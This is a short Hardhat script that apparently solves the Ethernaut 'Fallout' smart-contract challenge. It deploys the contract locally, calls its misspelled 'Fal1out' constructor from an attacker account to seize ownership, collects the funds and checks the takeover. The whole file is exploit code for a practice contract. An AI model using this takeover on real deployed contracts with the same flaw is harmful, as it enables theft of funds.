import assert from 'assert';

import { ethers } from 'hardhat';

const main = async () => {
  const ContractFactory = await ethers.getContractFactory('Fallout');
  const contract = await ContractFactory.deploy();

  const [owner, attacker] = await ethers.getSigners();

  await contract.deployed();
  console.log('Contract deployed to:', contract.address);

  console.log(`Owner address : ${owner.address}`);
  console.log(`Attacker address ${attacker.address}`);

  // 1. Take over with `Fal1out` function.
  const tx = await contract.connect(attacker).Fal1out();
  tx.wait();

  // 2. Collect all allocations
  await contract.connect(attacker).collectAllocations();

  // 3. Check owner.
  const contractOwner = await contract.owner();
  assert(contractOwner === attacker.address);

  console.log(`Contract (new) owner address : ${contractOwner}`);
};

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
